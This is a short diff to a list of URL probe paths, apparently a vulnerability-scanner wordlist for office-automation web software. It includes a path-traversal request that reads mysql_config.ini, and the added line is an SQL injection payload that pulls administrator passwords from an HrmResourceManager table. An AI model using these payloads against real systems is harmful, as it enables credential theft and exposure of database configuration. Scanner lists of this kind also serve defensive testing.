@@ -1,3 +1,4 @@
 /services%20/WorkflowServiceXml
 /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
 /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp
+/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
